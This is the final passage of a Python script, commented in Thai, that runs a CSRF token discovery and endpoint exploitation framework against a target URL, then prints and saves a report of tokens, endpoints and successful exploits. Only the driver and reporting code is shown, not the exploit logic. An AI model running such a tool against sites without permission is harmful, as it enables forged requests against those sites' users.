            print_cute("\n🔍 เริ่มค้นหา CSRF tokens...", Colors.GREEN)
            csrf_tokens = await framework.discover_csrf_tokens(target_url)
        
        if choice in ['2', '3', '4']:
            # ค้นหา endpoints
            print_cute("\n🌐 เริ่มค้นหา endpoints...", Colors.GREEN)
            endpoints = await framework.discover_endpoints_comprehensive(target_url, csrf_tokens)
        
        if choice == '4' and csrf_tokens and endpoints:
            # ทำการ exploitation
            print_cute("\n💥 เริ่มการ exploitation...", Colors.RED)
            exploit_results = await framework.exploit_endpoints_with_csrf(endpoints, csrf_tokens)
        
        # สร้างรายงาน
        timestamp = int(time.time())
        report_filename = f"csrf_endpoint_report_{timestamp}.txt"
        report = framework.generate_comprehensive_report(csrf_tokens, endpoints, exploit_results)
        
        # บันทึกรายงาน
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(report)
        
        print_cute(f"\n📋 สร้างรายงานแล้ว: {report_filename}", Colors.GREEN)
        
        # แสดงสรุปสำคัญ
        print_cute("\n🎯 สรุปผลลัพธ์:", Colors.BOLD)
        print_cute(f"   🔑 CSRF Tokens: {len(csrf_tokens)} ตัว", Colors.GREEN)
        print_cute(f"   🌐 Endpoints: {len(endpoints)} ตัว", Colors.GREEN)
        successful_exploits = len([r for r in exploit_results if r['success']]) if exploit_results else 0
        print_cute(f"   💥 Successful Exploits: {successful_exploits} ตัว", 
                  Colors.RED if exploit_results else Colors.GREEN)
        
        # แสดงตัวอย่าง findings
        if csrf_tokens:
            print_cute("\n🔑 ตัวอย่าง CSRF Tokens:", Colors.CYAN)
            for token in csrf_tokens[:3]:
                token_preview = (token.token_value[:25] + "..." 
                               if len(token.token_value) > 25 
                               else token.token_value)
                print(f"   • {token.token_name}: {token_preview}")
        
        if endpoints:
            print_cute("\n🌐 ตัวอย่าง Endpoints:", Colors.CYAN)
            for endpoint in endpoints[:5]:
                print(f"   • {endpoint.method} {endpoint.url}")
        
        # ทำความสะอาด
        framework.cleanup_resources()
        
    except KeyboardInterrupt:
        print_cute("\n⏹️ หยุดการทำงานโดยผู้ใช้", Colors.YELLOW)
    except Exception as e:
        print_error(f"เกิดข้อผิดพลาด: {e}")
    finally:
        print_cute("\n💖 ขอบคุณที่ใช้ Enhanced CSRF + Endpoint Framework ค่า!", Colors.PINK)

if __name__ == "__main__":
    asyncio.run(main())
